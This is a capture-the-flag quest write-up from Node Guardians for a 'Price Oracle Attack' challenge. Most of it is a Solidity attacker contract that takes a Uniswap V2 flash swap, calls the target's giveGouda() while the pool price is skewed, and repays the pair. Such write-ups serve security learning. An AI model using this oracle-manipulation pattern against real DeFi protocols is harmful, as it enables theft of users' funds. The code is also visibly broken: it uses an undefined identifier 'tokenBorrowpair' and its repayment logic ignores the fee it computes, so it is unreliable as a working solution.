---
title: Price Oracle Attack
weight: 3
type: docs
---

- Link: https://nodeguardians.io/dev-hub/quests/price-oracle-attack</br>
- About: flashswap</br>
- Author: Julien</br>
- Difficulty: 🗡🗡🗡🗡🗡</br>
- Language: Solidity</br>
- Skill Cat: Security</br>

---

Deployment address : `0x1FD0357FcD623C5a1472B7C922CdB7aa262FaEC1`

![Untitled](Price%20Oracle%20Attack%20db477759e79d497ba49faf0aecf90827/Untitled.png)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IUniswapV2Pair {
    function swap(
        uint amount0Out,
        uint amount1Out,
        address to,
        bytes calldata data
    ) external;
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IUniswapV2Factory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

interface IERC20 {
    function totalSupply() external view returns (uint);

    function balanceOf(address account) external view returns (uint);

    function transfer(address recipient, uint amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

interface IWETH is IERC20 {
    function deposit() external payable;

    function withdraw(uint amount) external;
}

interface IUniswapV2Callee {
    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external;
}

interface GoudaGobelin {
    function giveGouda() external;
}

contract Attacker is IUniswapV2Callee {
    address private constant UNISWAP_V2_FACTORY =
        0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;

    IERC20 private GOLD;
    IERC20 private GOUDA;

    GoudaGobelin instance;

    IUniswapV2Factory private factory = IUniswapV2Factory(UNISWAP_V2_FACTORY);

    IUniswapV2Pair private immutable pair;

    // For this example, store the amount to repay
    uint public amountToRepay;

    event Log(string message, uint val);

    constructor(address _gold, address _gouda, address exploited) {
        pair = IUniswapV2Pair(factory.getPair(address(_gouda), address(_gold)));
        GOLD = IERC20(_gold);
        GOUDA = IERC20(_gouda);
        instance = GoudaGobelin(exploited);
    }

    function getReserves() public view returns(uint112, uint112) {
      (uint112 r0, uint112 r1, ) = pair.getReserves();
      return (r0, r1);
    }

    function getPair() public view returns(address) {
      return address(pair);
    }

    function flashSwap(uint goldAmount) external {
        // Need to pass some data to trigger uniswapV2Call
        bytes memory data = abi.encode(address(GOLD), address(this));

        // amount0Out is Gouda, amount1Out is Gold
        pair.swap(goldAmount, 0, address(this), data);
    }

    // This function is called by the GOUDA/GOLD pair contract
    function uniswapV2Call(
        address sender,
        uint amount1,
        uint,
        bytes calldata data
    ) external {
        require(msg.sender == address(pair), "not pair");
        require(sender == address(this), "not sender");

        (address tokenBorrow) = abi.decode(data, (address));

        // Your custom code would go here. For example, code to arbitrage.
        require(tokenBorrow == address(GOLD), "token borrow != GOLD");

        uint fee = ((amount1 * 3) / 997) + 1;
        amountToRepay = amount1 + fee;

        uint goldBalance = GOLD.balanceOf(address(tokenBorrowpair));
        uint goudaBalance = GOUDA.balanceOf(address(pair));
        uint goudaPrice = goldBalance * 1 gwei / goudaBalance;
        uint ThisGoldBalance = GOLD.balanceOf(address(this));
        uint ThisGoudaBalance = GOUDA.balanceOf(address(this));

        emit Log("amount1", amount1);
        emit Log("Pair goldBalance", goldBalance);
        emit Log("Pair goudaBalance", goudaBalance);
        emit Log("Pair goudaPrice", goudaPrice);
        emit Log("This goudaBalance", ThisGoudaBalance);
        emit Log("This goldBalance", ThisGoldBalance);

        instance.giveGouda();

        goldBalance = GOLD.balanceOf(address(pair));
        goudaBalance = GOUDA.balanceOf(address(pair));
        goudaPrice = goldBalance * 1 gwei / goudaBalance;
        ThisGoldBalance = GOLD.balanceOf(address(this));
        ThisGoudaBalance = GOUDA.balanceOf(address(this));

        emit Log("amount1", amount1);
        emit Log("Pair goldBalance", goldBalance);
        emit Log("Pair goudaBalance", goudaBalance);
        emit Log("Pair goudaPrice", goudaPrice);
        emit Log("This goudaBalance", ThisGoudaBalance);
        emit Log("This goldBalance", ThisGoldBalance);

				// Flashswap fees
				require(GOUDA.approve(address(pair), 1 ether), 'approve failed.');
	      GOUDA.transfer(address(pair), 10000000000000000000000);

        // Repay
        GOLD.transfer(address(pair), amount1);
    }
}
```

[Solidity by Example](https://solidity-by-example.org/defi/uniswap-v2-flash-swap/)
